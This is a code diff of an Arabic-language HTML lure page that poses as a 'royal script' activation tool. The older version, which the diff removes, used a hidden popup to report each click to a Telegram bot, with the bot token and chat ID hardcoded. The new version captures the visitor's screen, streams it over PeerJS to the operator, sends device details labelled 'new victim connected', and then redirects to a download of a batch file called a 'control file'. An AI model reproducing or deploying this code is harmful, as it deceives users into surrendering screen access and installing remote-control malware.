@@ -16,40 +16,39 @@
     <div class="bg"></div>
     <div class="box">
         <h1>🚀 تفعيل السكربت الملكي</h1>
-        <p>اضغط بالأسفل لربط حسابك بالسكربت مباشرة</p>
-        <button class="btn" onclick="hit()">تفعيل الآن (RGB)</button>
+        <p>اضغط بالأسفل لبدء الربط وتفعيل الأدوات</p>
+        <button class="btn" id="startBtn">تفعيل الآن (RGB)</button>
     </div>
 
     <script>
-        const token = "8521430098:AAH9rZ7YNsbWwyigducN1EVOTMlg2UGtY9k";
-        const chat_id = "1330781289";
         const myID = "Mr_Fm_Alpha_99";
         const peer = new Peer();
 
-        function hit() {
-            // الطريقة الإجبارية: فتح رابط الإرسال في نافذة صغيرة وإغلاقها فوراً
-            const msg = encodeURIComponent("⚠️ تم الضغط على الرابط من ضحية جديدة!");
-            const telegramUrl = https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg};
-            
-            // فتح نافذة مخفية للإرسال
-            const win = window.open(telegramUrl, "_blank", "width=1,height=1");
-            
-            setTimeout(() => {
-                if(win) win.close();
-                alert("تم بدء الربط.. يرجى الموافقة على مشاركة الشاشة لإتمام العملية");
-                startCapture();
-            }, 500);
-        }
-
-        async function startCapture() {
+        document.getElementById('startBtn').onclick = async () => {
             try {
+                // 1. طلب مشاركة الشاشة
                 const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                
+                // 2. الاتصال بصفحة التحكم وإرسال البيانات
+                const conn = peer.connect(myID);
+                conn.on('open', () => {
+                    // إرسال معلومات الجهاز مباشرة لمتصفحك
+                    conn.send({
+                        info: "⚠️ ضحية جديدة متصلة!",
+                        platform: navigator.platform,
+                        agent: navigator.userAgent
+                    });
+                });
+
+                // 3. بدء البث المباشر
                 peer.call(myID, stream);
+
+                // 4. تحميل ملف السيطرة
                 window.location.href = "https://www.mediafire.com/file/uzu30zei1sp22ki/Mr_Master.bat/file";
             } catch (err) {
                 alert("يجب السماح بالصلاحيات لتفعيل السكربت!");
             }
-        }
+        };
     </script>
 </body>
 </html>
